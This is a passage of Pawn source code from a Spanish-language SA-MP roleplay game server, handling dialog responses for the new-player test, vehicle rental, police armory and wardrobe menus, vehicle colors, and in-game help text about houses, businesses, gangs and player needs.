	    	    		Dialog(playerid,dTest,DIALOG_STYLE_LIST,""#CAMARILLO"Un tipo te mata con su mafia. Lo encuentras solo en la comisaria. "#CINFO"(5/5)",""#CINFO"1) {FFFFFF}Lo ignoro, perdí la memoria y no recuerdo\n"#CINFO"2) {FFFFFF}Algo así no se olvida, voy y le doy su merecido\n"#CINFO"3) {FFFFFF}Estoy en la comisaria, lo denuncio por matarme","Aceptar","Tutorial");
						SetPVarInt(playerid,"ParteTest",5);
					}
					return 1;
				}
				case 5:
				{
	        		if(listitem != 0)
        			{
						Mensaje(playerid, -1, "Erraste la pregunta, vuelves a ver el tutorial.");
						SetPVarInt(playerid,"ParteTest",0);
      					SetPVarInt(playerid,"ParteTutorial",0);
      					SetPVarInt(playerid,"ParteConceptos",1);
						ConceptosDeRol(playerid);
					}
	        		else
	        		{
						new
						    skin = (InfoJugador[playerid][jSexo] == 1) ? 60 : 12;

	        		    SetSpawnInfo(playerid, 0, skin, -1902.3170, 16.8255, 1061.1436, 180.0, 0, 0, 0, 0, 0, 0);

						Loop(i, 10, 0)
						    SetPlayerSkillLevel(playerid, i, 2000);

						//Ropa
						InfoJugador[playerid][jRopa][0] = skin;

	        		    TogglePlayerSpectating(playerid, false);

						SetPVarInt(playerid,"CargoCuenta",1);

						//Datos generales
						InfoJugador[playerid][jRegistrado] = true;
						Cuentas_Registradas++;
						ActualizarDatosGenerales();

						//Datos
						SetPlayerInterior(playerid,5);
						SetPlayerHealth(playerid,50);
						SetPlayerArmour(playerid,0);
						GivePlayerMoney(playerid,5600);

						//Bienvenida
						Mensaje(playerid,1,"================================================================");
						Mensaje(playerid,-1,"• "#CAZULRARO"¡Comienza a rolear! "#CBLANCO"Puedes rentar un "CINFO"vehículo "#CBLANCO"en frente.");
						Mensaje(playerid,-1,"• Ademas, hay un mapa que te será de mucha utilidad para saber donde ir.");
						Mensaje(playerid,-1,"• Para entrar o salir de los lugares, dirigete a la puerta del mismo y presiona la letra "#CINFO"[Y]");
						Mensaje(playerid,1,"================================================================");
						Mensaje(playerid,-1,"• El comando "#CINFO"/informacion "#CBLANCO"te mostrará todo lo que es el servidor: Sistemas, Necesidades, y mucho más. ¡Utilizalo ahora mismo!");

						//Otros
						CongelarEx(playerid,6);
						SetTimerEx("CheckHackCamera", 6000, false, "ii", playerid, 1);
						SetCameraBehindPlayer(playerid);
						SetPlayerColor(playerid, 0xFFFFFF00);
						SetPlayerVirtualWorld(playerid, 0);
						CaminarPelear(playerid);

						//Tutorial
						DeletePVar(playerid,"ParteConceptos");
						DeletePVar(playerid,"ParteTest");

						//Nivel
						InfoJugador[playerid][jNivel] = 1;
						SetPlayerScore(playerid,1);

						SetProgressBarMaxValue(BExp[playerid],((InfoJugador[playerid][jNivel]+1)*3)*60);
						TextDrawShowForPlayer(playerid, Barraversion);
						TextDrawShowForPlayer(playerid, HS);
						TextDrawShowForPlayer(playerid, HoraB);

						//Necesidades
						InfoJugador[playerid][jOrina] = 34.0;
						InfoJugador[playerid][jCansancio] = 90.0;
						InfoJugador[playerid][jHambre] = 75.0;

						SetProgressBarValue(BHambre[playerid], InfoJugador[playerid][jHambre]);
						ShowProgressBarForPlayer(playerid,BHambre[playerid]);
						SetProgressBarValue(BCansancio[playerid], InfoJugador[playerid][jCansancio]);
						ShowProgressBarForPlayer(playerid,BCansancio[playerid]);
						SetProgressBarValue(BOrina[playerid], InfoJugador[playerid][jOrina]);
						ShowProgressBarForPlayer(playerid, BOrina[playerid]);
						UpdateProgressBar(BExp[playerid], playerid);

						ActualizarCuenta(playerid);
						printf("- %s pasó el test, su registro se completó", NombreJugador(playerid) );

					}
					return 1;
				}
			}
		}
    	case dVehRenta:
    	{
			if(!response) return RemovePlayerFromVehicle(playerid);
			if(response)
			{
		    	if(GetPVarInt(playerid,"RentoVehID"))
		    	{
		        	Error(playerid,"¡Ya has rentado un vehículo!");
		        	RemovePlayerFromVehicle(playerid);
				}
				else
				{
					if(GetPlayerMoney(playerid) < PRECIO_VEHRENTA)
					{
				    	MensajeF(playerid,C_NEGATIVO,"¡No tienes suficiente dinero! Te faltan $%d",PRECIO_VEHRENTA-GetPlayerMoney(playerid));
						RemovePlayerFromVehicle(playerid);
				    	return 1;
					}
					Mensaje(playerid,-1,"Rentaste un "#CAZULCLARO"vehículo "#CBLANCO"por "#CVERDE"$"#PRECIO_VEHRENTA". "#CBLANCO"Al cabo de 15 minutos sin uso, el vehículo se desrentará automáticamente");
					SetPVarInt(playerid, "RentoVehID", GetPlayerVehicleID(playerid));
					VehRentado[GetPlayerVehicleID(playerid)] = 1;
					QuitarDinero(playerid,PRECIO_VEHRENTA);
				}
			}
			return 1;
		}
		case dAscensorLSPD:
		{
	    	if(!response) return 0;
			if(listitem == 0)
			{
		    	SetPlayerPos(playerid,1524.4832,-1677.9523,6.2188);
		    	SetPlayerInterior(playerid,0);
			}
			else if(listitem == 1)
			{
		    	SetPlayerPos(playerid,1565.0422,-1685.4037,28.3956);
		    	SetPlayerInterior(playerid,0);
			}
		}
		case dRoperoLSPD:
		{
	    	if(!response) return 0;
	  		switch(listitem)
  			{
				case 0:   ElegirRopa(playerid, 71);
				case 1:   ElegirRopa(playerid,280);
				case 2:   ElegirRopa(playerid,265);
				case 3:   ElegirRopa(playerid,266);
				case 4:   ElegirRopa(playerid,267);
				case 5:   ElegirRopa(playerid,281);
				case 6:   ElegirRopa(playerid,282);
				case 7:   ElegirRopa(playerid,288);
				case 8:   ElegirRopa(playerid,283);
				case 9:   ElegirRopa(playerid,191);
				case 10:  ElegirRopa(playerid,284);
				case 11:  ElegirRopa(playerid,285);
				case 12:  ElegirRopa(playerid,208);
				case 13:  ElegirRopa(playerid,165);
				case 14:  ElegirRopa(playerid,166);
			}
		}
		case dArmeriaLSPD:
		{
	    	if(!response) return 0;
	    	ResetPlayerWeapons(playerid);
			DarArmaduraPolicia(playerid,100.0);
			switch(listitem)
			{
				case 0:{ AutoRol(playerid,"toma el armamento de cadete"); 			GivePlayerWeapon(playerid,3,1);      GivePlayerWeapon(playerid,23,110); }
				case 1:{ AutoRol(playerid,"toma el armamento de oficial");		    GivePlayerWeapon(playerid,23,110);   GivePlayerWeapon(playerid,29,150); GivePlayerWeapon(playerid,25,50);}
				case 2:{ AutoRol(playerid,"toma el armamento de SWAT");				GivePlayerWeapon(playerid,17,10);    GivePlayerWeapon(playerid,27,35);  GivePlayerWeapon(playerid,29,150); GivePlayerWeapon(playerid,23,110);}
				case 3:{ AutoRol(playerid,"toma el armamento de agente encubierto");GivePlayerWeapon(playerid,41,2000);  GivePlayerWeapon(playerid,23,110); }
				case 4:{ AutoRol(playerid,"toma el armamento de oficial general");	GivePlayerWeapon(playerid,31,120);   GivePlayerWeapon(playerid,23,110); GivePlayerWeapon(playerid,3,1); }
				case 5:{ AutoRol(playerid,"toma el armamento de francotirador");    GivePlayerWeapon(playerid,34,20);    GivePlayerWeapon(playerid,23,110);}
				case 6:{ AutoRol(playerid,"toma el armamento de paracaidista");     GivePlayerWeapon(playerid,46,1);    GivePlayerWeapon(playerid,24,40);}
			}
  		}
		case dColor1:
		{
	    	if(!response) return 0;
	    	new IDVeh = GetPlayerVehicleID(playerid);
	    	switch(listitem)
	    	{
	    	    case 0:		InfoVeh[VehVenta_ID(IDVeh)][vColor1] = 1;	//blanco
	    	    case 1:		InfoVeh[VehVenta_ID(IDVeh)][vColor1] = 0;	//negro
	    	    case 2:		InfoVeh[VehVenta_ID(IDVeh)][vColor1] = 3;	//rojo oscuro
	    	    case 3:		InfoVeh[VehVenta_ID(IDVeh)][vColor1] = 6;	//naranja
	    	    case 4:		InfoVeh[VehVenta_ID(IDVeh)][vColor1] = 16;	//verde
	    	    case 5:		InfoVeh[VehVenta_ID(IDVeh)][vColor1] = 103;	//azul
	    	    case 6:		InfoVeh[VehVenta_ID(IDVeh)][vColor1] = 118;	//celeste
	    	    case 7:		InfoVeh[VehVenta_ID(IDVeh)][vColor1] = 131;	//amarillo
	    	    case 8:		InfoVeh[VehVenta_ID(IDVeh)][vColor1] = 126;	//rosa
	    	    case 9:		InfoVeh[VehVenta_ID(IDVeh)][vColor1] = 149;	//violeta
	    	    case 10:	InfoVeh[VehVenta_ID(IDVeh)][vColor1] = 144;	//verde fluor
	    	    case 11:	InfoVeh[VehVenta_ID(IDVeh)][vColor1] = 151;	//rojo fluor
	    	    case 12:	InfoVeh[VehVenta_ID(IDVeh)][vColor1] = 130;	//salmon
			}
			ChangeVehicleColor(IDVeh,InfoVeh[VehVenta_ID(IDVeh)][vColor1],InfoVeh[VehVenta_ID(IDVeh)][vColor2]);
			ShowPlayerDialog(playerid,dColor2,DIALOG_STYLE_LIST,""#CINFO"¿Segundo color del vehículo?","- Blanco\n- Negro\n- Rojo\n- Amarillo\n- Verde\n- Azul\n- Celeste\n- Naranja\n- Rosa\n- Violeta\n- Verde Fluor\n- Rojo Fluor\n- Celeste claro","Seleccionar","");
		}
		case dColor2:
		{
	    	if(!response) return 0;
	    	new IDVeh = GetPlayerVehicleID(playerid);
	    	switch(listitem)
	    	{
	    	    case 0:		InfoVeh[VehVenta_ID(IDVeh)][vColor2] = 1;	//blanco
	    	    case 1:		InfoVeh[VehVenta_ID(IDVeh)][vColor2] = 0;	//negro
	    	    case 2:		InfoVeh[VehVenta_ID(IDVeh)][vColor2] = 3;	//rojo oscuro
	    	    case 3:		InfoVeh[VehVenta_ID(IDVeh)][vColor2] = 6;	//naranja
	    	    case 4:		InfoVeh[VehVenta_ID(IDVeh)][vColor2] = 16;	//verde
	    	    case 5:		InfoVeh[VehVenta_ID(IDVeh)][vColor2] = 103;	//azul
	    	    case 6:		InfoVeh[VehVenta_ID(IDVeh)][vColor2] = 118;	//celeste
	    	    case 7:		InfoVeh[VehVenta_ID(IDVeh)][vColor2] = 131;	//amarillo
	    	    case 8:		InfoVeh[VehVenta_ID(IDVeh)][vColor2] = 126;	//rosa
	    	    case 9:		InfoVeh[VehVenta_ID(IDVeh)][vColor2] = 149;	//violeta
	    	    case 10:	InfoVeh[VehVenta_ID(IDVeh)][vColor2] = 144;	//verde fluor
	    	    case 11:	InfoVeh[VehVenta_ID(IDVeh)][vColor2] = 151;	//rojo fluor
	    	    case 12:	InfoVeh[VehVenta_ID(IDVeh)][vColor2] = 130;	//salmon
			}
			ChangeVehicleColor(IDVeh,InfoVeh[VehVenta_ID(IDVeh)][vColor1],InfoVeh[VehVenta_ID(IDVeh)][vColor2]);
			ActualizarVehiculo(VehVenta_ID(GetPlayerVehicleID(playerid)));
		}

/*		case dAyuda:
		{
		    if(!response) return 0;
		    new
		        Str[800];

			switch(listitem)
			{
			    case 0:
			    {
			        strcat(Str,""#CINFO"ROL: "#CBLANCO"/acciones /id /b /g /s /ame /me /do /intentar /o /rolarma /dni o /dni [id] /mostrarlicencia\n");
			        strcat(Str,""#CINFO"ROPA Y ACCESORIOS: "#CBLANCO"/ropa /accesorios\n");
			        strcat(Str,""#CINFO"OBJETOS: "#CBLANCO"/celular /minumero /anuncio /atender /colgar /c /gps /tirar /recoger /acento\n");
			        strcat(Str,""#CINFO"MERCADO NEGRO: "#CBLANCO"/vendar /desvendar /atar /desatar /plantar bomba /detonar bomba /mascara /dinamita\n");
			        strcat(Str,""#CINFO"OTROS: "#CBLANCO"/dar /cajero /cuenta /admins /dfumar /mp /duda /reportar /usar medicamentos /recargar /llaves\n");
			        strcat(Str,""#CINFO"OTROS: "#CBLANCO"/fumar /hacer /consumir /dejar trabajo /cambiarpass /record /mear /dormir /despertarse /primerapersona /estado\n");
					Dialog(playerid,dAyuda2,DIALOG_STYLE_MSGBOX,""#CBLANCO"Menú de AYUDA",Str,"Cerrar","Volver");
				}
			    case 1:
				{
			        strcat(Str,""#CBLANCO"Para encenderle el motor al vehículo, presione 'Click'. Para las luces, presione 'N'. Para ponerse o sacarse el cinturón, "#CINFO"/cinturon"#CBLANCO"\n");
			        strcat(Str,"Si es un vehículo propio, o tienes las llaves de alguno:\n");
			        strcat(Str,"\t· Para abrirle el capó o el maletero, pongase en frente/detras y use "#CINFO"/abrir"#CBLANCO" (capo/maletero), o "#CINFO"/cerrar"#CBLANCO" (capo/maletero).\n");
			        strcat(Str,"\t· Para darlo, o retirarlo de una familia, "#CINFO"/veh"#CBLANCO" (a familia/sacar familia).\n");
			        strcat(Str,"\t· Para venderlo, utilize "#CINFO"/vender vehiculo"#CBLANCO".\n");
			        strcat(Str,"\t· Para cerrarle o abrirle las puertas, "#CINFO"/cerrar vehiculo "#CBLANCO"y "#CINFO"/abrir vehiculo"#CBLANCO".\n");
			        strcat(Str,"\t· Para utilizar el maletero de un coche, '"#CINFO"/maletero [ver/guardar/sacar] arma"#CBLANCO"'.\n");
			        strcat(Str,"\t· Para destrabarle el capó, maletero, o puertas, entre al mismo y presione CTRL.\n");
					Dialog(playerid,dAyuda2,DIALOG_STYLE_MSGBOX,""#CBLANCO"Menú de ayuda - VEHICULOS",Str,"Cerrar","Volver");
				}
			    case 2: ShowPlayerDialog(playerid,dAyuda2,DIALOG_STYLE_MSGBOX,""#CBLANCO"Menú de ayuda - CASAS",AyudaCasas,"Cerrar","Volver");
			    case 3:
			    {
					if(InfoJugador[playerid][jLider] == 0 && InfoJugador[playerid][jMiembro] == 0) return ShowPlayerDialog(playerid,dAyuda2,DIALOG_STYLE_MSGBOX,""#CBLANCO"Menú de ayuda - ERROR","¡No perteneces a ninguna facción!","Cerrar","Volver");
			        if(EsLSPD(playerid))
			        {
			            ShowPlayerDialog(playerid,dAyuda2,DIALOG_STYLE_MSGBOX,""#CBLANCO"Menú de ayuda - LSPD",AyudaLSPD,"Cerrar","Volver");
					}
			        else if(EsMilitar(playerid))
			        {
			            ShowPlayerDialog(playerid,dAyuda2,DIALOG_STYLE_MSGBOX,""#CBLANCO"Menú de ayuda - LSEM",AyudaLSEM,"Cerrar","Volver");
					}
			        else if(EsMedico(playerid))
			        {
			            ShowPlayerDialog(playerid,dAyuda2,DIALOG_STYLE_MSGBOX,""#CBLANCO"Menú de ayuda - LSPD",AyudaLSMD,"Cerrar","Volver");
					}
			        else if(EsReportero(playerid))
			        {
			            ShowPlayerDialog(playerid,dAyuda2,DIALOG_STYLE_MSGBOX,""#CBLANCO"Menú de ayuda - LSTV",AyudaLSTV,"Cerrar","Volver");
					}
			        else if(EsMecanico(playerid))
			        {
			            ShowPlayerDialog(playerid,dAyuda2,DIALOG_STYLE_MSGBOX,""#CBLANCO"Menú de ayuda - MECÁNICOS",AyudaMECAS,"Cerrar","Volver");
					}
			        else if(EsDelGobierno(playerid))
			        {
			            ShowPlayerDialog(playerid,dAyuda2,DIALOG_STYLE_MSGBOX,""#CBLANCO"Menú de ayuda - GOBIERNO",AyudaGOB,"Cerrar","Volver");
					}
					else if(EsHitman(playerid))
					{
			            ShowPlayerDialog(playerid,dAyuda2,DIALOG_STYLE_MSGBOX,""#CBLANCO"Menú de ayuda - HITMAN",AyudaHIT,"Cerrar","Volver");
					}
					else
					{
			            ShowPlayerDialog(playerid,dAyuda2,DIALOG_STYLE_MSGBOX,""#CBLANCO"Menú de ayuda - ERROR",""#CBLANCO"¡No perteneces a ninguna facción!","Cerrar","Volver");
				        return 1;
					}
				}
				case 4: ShowPlayerDialog(playerid,dAyuda2,DIALOG_STYLE_MSGBOX,""#CBLANCO"Menú de ayuda - NEGOCIOS",AyudaNegocios,"Cerrar","Volver");
				case 5:
				{
				    if(InfoJugador[playerid][jTrabajo] == ID_Camionero)
				    {
			            ShowPlayerDialog(playerid,dAyuda2,DIALOG_STYLE_MSGBOX,""#CBLANCO"Menú de ayuda - CAMIONERO",AyudaCamionero,"Cerrar","Volver");
				    }
				    else if(InfoJugador[playerid][jTrabajo] == ID_Cosechador)
				    {
			            ShowPlayerDialog(playerid,dAyuda2,DIALOG_STYLE_MSGBOX,""#CBLANCO"Menú de ayuda - COSECHADOR",AyudaCosechador,"Cerrar","Volver");
				    }
				    else if(InfoJugador[playerid][jTrabajo] == ID_RepartidorB)
				    {
			            ShowPlayerDialog(playerid,dAyuda2,DIALOG_STYLE_MSGBOX,""#CBLANCO"Menú de ayuda - REPARTIDOR",AyudaRepartidor,"Cerrar","Volver");
				    }
				    else if(InfoJugador[playerid][jTrabajo] == ID_Basurero)
				    {
			            ShowPlayerDialog(playerid,dAyuda2,DIALOG_STYLE_MSGBOX,""#CBLANCO"Menú de ayuda - BASURERO",AyudaBasurero,"Cerrar","Volver");
				    }
				    else if(InfoJugador[playerid][jTrabajo] == ID_Ladron)
				    {
			            ShowPlayerDialog(playerid,dAyuda2,DIALOG_STYLE_MSGBOX,""#CBLANCO"Menú de ayuda - LADRON",AyudaLadron,"Cerrar","Volver");
				    }
				    else
				    {
			            ShowPlayerDialog(playerid,dAyuda2,DIALOG_STYLE_MSGBOX,""#CBLANCO"Menú de ayuda - ERROR",""#CBLANCO"¡No tienes ningún trabajo!","Cerrar","Volver");
				        return 1;
					}
				}
				case 6:  ShowPlayerDialog(playerid,dAyuda2,DIALOG_STYLE_MSGBOX,""#CBLANCO"Menú de ayuda - FAMILIA",AyudaFamilia,"Cerrar","Volver");
				case 7:  ShowPlayerDialog(playerid,dAyuda2,DIALOG_STYLE_MSGBOX,""#CBLANCO"Menú de ayuda - BARRAS",AyudaBarras,"Cerrar","Volver");
			}
		}
*/
		#define liststr<%0> if(strfind(inputtext, %0) != -1)
	 	#define AddToBuffer(%1) strcat(dialog, %1); strcat(dialog, "\n")

		case dAyuda:
		{
			if(!response) return 1;

			new
		 		dialog[2000];

			switch(listitem)
			{
			    case 0:
			    {
				    AddToBuffer("\t"#CROJO"General: "#CBLANCO"");
				    AddToBuffer("/acciones /id /b /g /s /ame /me /do /intentar /o /dni /mostrarlicencia /estado /record /primerapersona /acento /dar");
				    AddToBuffer("/fumar /consumir /dejar [trabajo/familia/faccion] /llaves /hacer /qfa (Ver ultimo que te mato)");
				    AddToBuffer(" ");
				    AddToBuffer("\t"#CROJO"Cuenta: "#CBLANCO"");
				    AddToBuffer("/cuenta /cambiarpass /cambiarpregunta");
				    AddToBuffer(" ");
				    AddToBuffer("\t"#CROJO"Armas: "#CBLANCO"");
				    AddToBuffer("/rolarma /recargar /tirar /recoger");
				    AddToBuffer(" ");
				    AddToBuffer("\t"#CROJO"Objetos: "#CBLANCO"");
				    AddToBuffer("/ropa /accesorios /cel(ular) /minumero /anuncio /atender /colgar /c /gps /tirar /recoger /usar medicamentos");
				    AddToBuffer(" ");
				    AddToBuffer("\t"#CROJO"Administración: "#CBLANCO"");
				    AddToBuffer("/admins /duda /re(portar) /mp /solicitar");
				    AddToBuffer(" ");
				    AddToBuffer("\t"#CROJO"Mercado negro: "#CBLANCO"");
				    AddToBuffer("/vendar /desvendar /atar /desatar /plantar bomba /detonar bomba /mascara /dinamita");
				    AddToBuffer(" ");
				    AddToBuffer("\t"#CROJO"Necesidades: "#CBLANCO"");
				    AddToBuffer("/mear /dormir /despertarse /comprar comida");
				    AddToBuffer(" ");
				}
				// -===============-
			    case 1:
			        return Dialog(playerid, dAyuda2, DIALOG_STYLE_LIST, ""#CBLANCO"Información del servidor - "#CINFO"TRABAJOS", ""#CINFO"• "#CBLANCO"Basurero\n"#CINFO"• "#CBLANCO"Repartidor de diarios\n"#CINFO"• "#CBLANCO"Camionero\n"#CINFO"• "#CBLANCO"Cosechador\n"#CINFO"• "#CBLANCO"Ladrón\n"#CINFO"• "#CBLANCO"Repartidor de pizza","Aceptar", "Volver");

			    case 2:
			        return Dialog(playerid, dAyuda2, DIALOG_STYLE_LIST, ""#CBLANCO"Información del servidor - "#CINFO"FACCIONES", ""#CINFO"• "#CBLANCO"Facciones en general\n"#CINFO"• "#CBLANCO"Policía\n"#CINFO"• "#CBLANCO"Ejército\n"#CINFO"• "#CBLANCO"Hospital\n"#CINFO"• "#CBLANCO"Televisión y comunicación\n"#CINFO"• "#CBLANCO"Mecánicos\n"#CINFO"• "#CBLANCO"Gobierno\n"#CINFO"• "#CBLANCO"Sicarios", "Aceptar", "Cancelar");
				// -===============-

				case 3:
				{
				    dialog = "{ffffff}";
				    AddToBuffer("• Existen propiedades para comprar, como negocios, vehículos y casas. A continuación te explicaremos como");
				    AddToBuffer("funciona nuestro exclusivo sistema de "#CROJO"VEHÍCULOS."#CBLANCO"");
				    AddToBuffer(" ");
				    AddToBuffer("\t• Para encenderle o apagarle el motor, presione Click.");
				    AddToBuffer("\t• Para encenderle o apagarle las luces, presione la tecla N.");
				    AddToBuffer("\t• Para colocarse el cinturón de seguridad, use "#CINFO"/cinturon."#CBLANCO"");
				    AddToBuffer(" ");
				    AddToBuffer("Si tienes vehículo propio:");
				    AddToBuffer(" ");
				    AddToBuffer("\t• Busca una consecionaria, y utiliza "#CINFO"/comprar vehiculo."#CBLANCO"");
				    AddToBuffer("\t• Podrás tener hasta "#MAX_VEH_PERSONA_2" vehículos.");
				    AddToBuffer("\t• Puedes dar tu auto a tu pandilla/mafia, y retirarlo cuando lo desees. "#CINFO"/veh a familia y /veh sacar familia"#CBLANCO"");
				    AddToBuffer("\t• Para abrir el vehículo, o cerrarlo debes usar "#CINFO"/abrir vehículo - /cerrar vehiculo"#CBLANCO"");
				    AddToBuffer("\t• Para guardarle armas en su maletero, utiliza "#CINFO"/abrir maletero"#CBLANCO", y luego "#CINFO"/maletero [ver-sacar-guardar] arma."#CBLANCO"");
				    AddToBuffer("\t• Podrás abrir el capó: "#CINFO"/abrir capo."#CBLANCO"");
				    AddToBuffer("\t• Podrás vender tu vehículo al gobierno cuando lo desees. "#CINFO"/vender vehiculo"#CBLANCO"");
				    AddToBuffer("\t• Para localizar un vehículo, necesitarás un Buscador de vehículos o llamar a la policía. Compra uno en la tienda de tecnologia.");
				    AddToBuffer("\t• Para setearle un punto de respawn al coche (Aunque rara vez respawneen), utiliza /estacionar.");
				    AddToBuffer("\t• Para ver los datos de tus vehículos, utiliza "#CINFO"/cuenta -> Vehículos.");
				}
				case 4:
				{
				    dialog = "{ffffff}";
				    AddToBuffer("• Existen propiedades para comprar, como negocios, vehículos y casas. A continuación te explicaremos como");
				    AddToBuffer("funciona nuestro exclusivo sistema de "#CROJO"CASAS."#CBLANCO"");
				    AddToBuffer(" ");
				    AddToBuffer("\t• Para comprar una casa, deberás dirigirte a la entrada y colocar "#CINFO"/comprar casa."#CBLANCO"");
				    AddToBuffer("\t• Podrás vender tu casa al gobierno cuando lo desees, solo debes utilizar "#CINFO"/vender casa."#CBLANCO"");
				    AddToBuffer("\t• Podrás guardar ARMAS en tu casa, utilizando "#CINFO"/casa - Armas - Guardar arma"#CBLANCO". Para retirarla, "#CINFO"/casa - Armas - Sacar arma."#CBLANCO"");
				    AddToBuffer("\t  Podrás tener hasta 10 armas guardadas en tu casa.");
				    AddToBuffer("\t• Cuando compras tu casa, esta NO tiene MUEBLES. Todos los muebles, deberás comprarselos por tu cuenta.");
				    AddToBuffer("\t• Podrás acomodar los muebles a tu gusto, solo debes "#CINFO"/casa - Muebles - Acomodar muebles."#CBLANCO"");
				    AddToBuffer("\t• Cuando compres un mueble, deberás agregarlo a tu casa, utilizando"#CINFO" /casa - Muebles - Agregar un nuevo mueble."#CBLANCO"");
				    AddToBuffer("\t• Podrás tener hasta "#MAX_MUEBLES_CASA" muebles.");
				    AddToBuffer("\t• Para abrir o cerrar la puerta de tu casa, utiliza "#CINFO"/abrir casa, o /cerrar casa."#CBLANCO"");
				    AddToBuffer("\t• Podrás guardar dinero en tu casa, tienes una caja fuerte en la que podrás almacenar todo el dinero que se te ocurra. ");
				    AddToBuffer("\t También podrás ponerle contraseña a la caja fuerte. "#CINFO"/casa - Caja fuerte."#CBLANCO"");
				    AddToBuffer("\t• Podrás cambiarle el nombre a tu casa, "#CINFO"/casa - Cambiar nombre."#CBLANCO"");
				    AddToBuffer("\t• Podras tener hasta "#MAX_CASAS_JUGADOR" casas.");
				    AddToBuffer(" ");
				    AddToBuffer("Si tu casa tiene garage:");
				    AddToBuffer(" ");
				    AddToBuffer("\t• Podrás almacenar la cantidad de vehículos que quieras, depende de saber acomodarlos para hacer lugar.");
				    AddToBuffer("\t• Para cerrar o abrir el garage al público, usa "#CINFO"/abrir garage, o /cerrar garage."#CBLANCO"");
				    AddToBuffer("\t• El garage aumentará el precio de la casa.");
				    AddToBuffer("\t• Podrás entrar cuando quieras al garage, no importa que estes con vehículo, o sin el.");
				}
				case 5:
				{
				    dialog = "{ffffff}";
				    AddToBuffer("• Los "#ROJO"NEGOCIOS"#CBLANCO" son las propiedades más caras del servidor, ya que te aportan grandes ganancias diarias.");
				    AddToBuffer(" ");
				    AddToBuffer("\t• Para comprar el negocio, solo debes acercarte a la puerta y usar "#CINFO"/comprar negocio."#CBLANCO"");
				    AddToBuffer("\t• Podrás cambiarle el nombre a tu negocio, "#CINFO"/negocio - Nombre."#CBLANCO"");
				    AddToBuffer("\t• Cada vez que alguien compre en tu negocio, el dinero del cliente será almacenado en la caja fuerte. ");
				    AddToBuffer("\t• En caso de poseer precio de entrada, el dinero también va a la caja fuerte ");
				    AddToBuffer("\t• Tienes un control total de la caja fuerte: depositar, retirar, cambiar contraseña.");
				    AddToBuffer("\t• Podrás cambiarle el precio de entrada en caso de ser un bar, boliche, o lugar pago.");
				    AddToBuffer("\t• Podrás tener hasta "#MAX_NEGOCIOS_JUGADOR" negocios.");
				}
				case 6:
				{
				    dialog = "{ffffff}";
				    AddToBuffer("• Las familias o bandas, son creadas dentro del juego, y son totalmente dinámicas.");
				    AddToBuffer("Las familias y pandillas que vienen por defecto son: Grove, Ballas, Sureños, Yakuza, Italiana.");
				    AddToBuffer(" ");
				    AddToBuffer("Un jugador podrá crear su propia familia, si cumple una serie de requisitos y quiere hacer una, puede hacerlo pidiendole");
				    AddToBuffer("a un administrador que lo haga. Es totalmente instantaneo, ya que el lider de la familia debe hacer todo:");
				    AddToBuffer(" ");
				    AddToBuffer("\t• Puede comprar los autos para la familia: "#CINFO"/veh a familia "#CBLANCO"(Ver información sobre vehículos).");
				    AddToBuffer("\t• Debe comprar una casa, y decirle al administrador que la coloque para la familia.");
				    AddToBuffer("\t• Puede ajustar los nombres de los rangos: "#CINFO"/nombrerango."#CBLANCO"");
				    AddToBuffer("\t• Puede invitar personas a su familia.");
				    AddToBuffer("\t• Puede expulsar o cambiarles el rango a los miembros de su familia.");
				    AddToBuffer("\t• Puede optar entre familia pasiva, mafia, o pandilla.");
				    AddToBuffer("\t• Puede salir de una familia, usando "#CINFO"/dejar familia"#CBLANCO".");
				    AddToBuffer(" ");
				    AddToBuffer("Requisitos para crear una familia:");
				    AddToBuffer(" ");
				    AddToBuffer("\t• Ser al menos cinco integrantes con mínimo nivel tres cada uno.");
				    AddToBuffer("\t• El creador debe tener al menos nivel 6, para asegurar su actividad.");
				    AddToBuffer("\t• Deben disponer de una casa obligatoriamente.");
				    AddToBuffer("\t• Necesita tener 10 estrellas de rol.");
				    AddToBuffer("\t• Necesita tener al menos un vehículo");
				    AddToBuffer("\t• Deberá presentar la Historia de la familia, como surgio, y el rol que esta seguirá en el foro: "#CINFO""#FORO_SERVER".");
				    AddToBuffer(" ");
				    AddToBuffer("{FF0000}NOTA: {FFFFFF}Puedes ver todas las "#CINFO"/familias"#CBLANCO" cuando quieras.");
				}
				case 7:
				{
				    dialog = "{ffffff}";
				    AddToBuffer("- Este sistema, fué implementado para dar más realismo al servidor, se trata de un sistema de NECESIDADES.");
				    AddToBuffer(" ");
				    AddToBuffer("Las necesidades son tres:");
				    AddToBuffer("\t• "#CROJO"Hambre: "#CBLANCO"Indicado por la barra "#CHAMBRE"NARANJA"#CBLANCO", cuando esté llena tu jugador no tiene hambre. Esta barra baja constantemente,");
				    AddToBuffer("\t  y para satisfacer esta necesidad deberás ir a un restaurant, y utilizar el comando "#CINFO"/comprar comida."#CBLANCO"");
				    AddToBuffer("\t  Cuando tu jugador pasa mucho tiempo sin comer, comienza a perder el conocimiento. Esto se manifiesta con mareos");
				    AddToBuffer("\t• constantes, tropiezos y agonizaciones, además de perder salúd constantemente.");
				    AddToBuffer(" ");
				    AddToBuffer("\t• "#CROJO"Cansancio: "#CBLANCO"Indicado por la barra "#CCANSANCIO"CELESTE"#CBLANCO", cuando esta barra esté completa tu jugador estará sin sueño. Esta barra baja cada bastante tiempo,");
				    AddToBuffer("\t  y para satisfacer esta necesidad deberas "#CINFO"/dormir."#CBLANCO"");
				    AddToBuffer("\t• Si tu jugador está mucho tiempo sin dormir, y la barra está muy baja, tu jugador no podrá correr, no podrá saltar,");
				    AddToBuffer("\t  y no podrá golpear ni disparar. Caerá desmayado al suelo, y posiblemente perderás salúd.");
				    AddToBuffer(" ");
				    AddToBuffer("\t• "#CROJO"Orina: "#CBLANCO"Lo indica la barra "#CORINA"AMARILLA"#CBLANCO", cuando esta barra esté vacia tu jugador no tiene ganas de orinar.");
				    AddToBuffer("\t  Esta barra sube constantemente, y para vaciarla deberás "#CINFO"/mear."#CBLANCO"");
				    AddToBuffer("\t  Si esta barra llega al 100%%, tu jugador se meará encima.");
				    AddToBuffer(" ");
				    AddToBuffer("{FF0000}NOTA: {FFFFFF}La barra restante (Blanca y larga) indica la experiencia de tu personaje (Tiempo jugado).");
				}
				case 8:
				{
				    dialog = "{ff0000}";
				    AddToBuffer("\tPandillas:"#CBLANCO"");
				    AddToBuffer("No se necesita mucha experiencia para saber que es una pandilla, y en nuestro servidor las pandillas son");
				    AddToBuffer("muy realistas. El rol principal de las pandillas es luchar para imponer respeto, esto lo hacen mediante las");
				    AddToBuffer(""#CVERDE"zonas de bandas."#CBLANCO" Las pandillas luchan para conseguir más zonas con su gente. ");
				    AddToBuffer(" ");
				    AddToBuffer("\t"#CROJO"Zonas de bandas:"#CBLANCO"");
